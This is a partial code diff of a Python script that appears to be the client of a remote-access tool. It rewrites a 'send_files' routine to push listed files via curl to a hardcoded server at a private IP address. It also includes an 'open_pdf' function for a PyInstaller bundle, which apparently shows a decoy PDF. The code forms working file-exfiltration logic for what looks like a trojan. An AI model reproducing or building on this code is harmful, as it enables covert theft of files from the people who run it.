@@ -5,28 +5,35 @@ import shlex
 import threading
 import sys
 import webbrowser
-import requests
 SERVER_URL = "http://192.168.88.105:2020"
 def send_files(args):
     files_to_send = args[1:]
     if not files_to_send:
         print("No files provided to upload.")
         return
-    files = {}
-    for idx, file_path in enumerate(files_to_send):
+    valid_files = []
+    for file_path in files_to_send:
         try:
-            files[f"files{idx}"] = open(file_path, "rb")
+            with open(file_path, "rb"):
+                valid_files.append(file_path)
+        except FileNotFoundError:
+            print(f"File not found: {file_path}")
         except Exception as e:
-            print(f"Failed to open {file_path}: {e}")
-            continue
+            print(f"Cannot open {file_path}: {e}")
+    if not valid_files:
+        print("No valid files to send.")
+        return
+    curl_cmd = ["curl", "-X", "POST"]
+    for file_path in valid_files:
+        curl_cmd.extend(["-F", f"files=@{file_path}"])  
+    curl_cmd.append(f"{SERVER_URL}/upload")
     try:
-        response = requests.post(f"{SERVER_URL}/upload", files=files)
-        print("Serve payload: ", response.text)
+        result = subprocess.run(curl_cmd, capture_output=True, text=True)
+        print("Server response:", result.stdout)
+        if result.stderr:
+            print("Errors:", result.stderr)
     except Exception as e:
         print(f"Failed to send files: {e}")
-    finally:
-        for f in files.values():
-            f.close()
 def open_pdf():
     print("Open pdf in webborwser....")
     if hasattr(sys, "_MEIPASS"):
